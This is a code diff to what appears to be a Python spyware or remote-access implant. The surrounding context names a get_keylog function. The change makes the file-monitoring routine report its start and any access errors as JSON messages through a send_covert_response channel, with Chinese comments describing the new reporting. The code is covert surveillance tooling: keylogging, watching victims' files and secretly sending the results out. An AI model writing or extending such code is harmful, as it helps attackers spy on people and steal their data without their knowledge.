@@ -148,18 +148,40 @@ def get_keylog():
 
 def monitor_file(path):
     """Monitor a single file for changes using polling or inotify."""
-    last_mtime = None
+    # 尝试第一次 stat，如果失败就立刻发错误并退出
     try:
         last_mtime = os.path.getmtime(path)
-    except Exception:
-        mon_file_events.append(f"ERR: File {path} not found or inaccessible.")
+    except Exception as e:
+        msg = {
+        "type": "MON_FILE_ERROR",
+        "path": path,
+        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+        "content": f"File not accessible: {e}"
+        }
+        send_covert_response((json.dumps(msg) + "\n").encode())
         return
+    # 成功后，先发一条“监控已启动”消息
+    msg_start = {
+        "type": "MON_FILE_STARTED",
+        "path": path,
+        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+    }
+    send_covert_response((json.dumps(msg_start) + "\n").encode())
+
     # Simple polling loop
     while mon_file_path == path:
         try:
             mtime = os.path.getmtime(path)
         except Exception as e:
             mon_file_events.append(f"File {path} inaccessible: {e}")
+            # 文件变得不可访问时，也发 JSON 错误
+            msg = {
+                "type": "MON_FILE_ERROR",
+                "path": path,
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+                "content": f"File inaccessible during monitoring: {e}"
+            }
+            send_covert_response((json.dumps(msg) + "\n").encode())
             break
         if mtime != last_mtime:
             last_mtime = mtime
